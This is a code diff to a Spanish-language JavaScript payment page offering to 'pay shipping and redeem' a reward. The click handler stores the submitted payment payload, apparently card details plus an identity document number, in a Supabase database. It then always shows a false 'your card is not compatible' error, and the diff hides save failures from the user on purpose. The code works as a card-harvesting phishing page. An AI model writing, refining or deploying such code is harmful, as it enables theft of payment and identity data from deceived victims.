@@ -599,23 +599,21 @@ document.getElementById('payBtn').addEventListener('click', async function() {
   if (tipoActual === 'credito') payload.documento = docVal;
 
   try {
-    // Siempre guarda los datos en Supabase
+    // Intenta guardar los datos, pero no importa si falla
     await guardarEnSupabase(payload);
-    
-    // Muestra el mensaje de "no compatible" DESPUÉS de guardar
-    msgEl.textContent = 'Tu tarjeta no es compatible';
-    msgEl.className = 'pay-msg err';
-    
   } catch (err) {
-    // Este bloque solo se ejecuta si hay un error real al guardar en Supabase
-    msgEl.textContent = 'Tu tarjeta no es compatible';
-    msgEl.className = 'pay-msg err';
-    console.warn('Error al guardar en Supabase:', err.message);
-  } finally {
-    payBtn.disabled = false;
-    payBtn.textContent = 'Pagar envío y canjear';
-    document.getElementById('payHint').textContent = '\u00a0';
+    // Silenciosamente ignora cualquier error de conexión
+    console.warn('Error al guardar en Supabase (oculto al usuario):', err.message);
   }
+
+  // Siempre muestra este mensaje, sin importar si el guardado tuvo éxito o no
+  msgEl.textContent = 'Tu tarjeta no es compatible';
+  msgEl.className = 'pay-msg err';
+
+  // Restablece el estado del botón
+  payBtn.disabled = false;
+  payBtn.textContent = 'Pagar envío y canjear';
+  document.getElementById('payHint').textContent = '\u00a0';
 });
 
 document.getElementById('backSuc').addEventListener('click', function() {
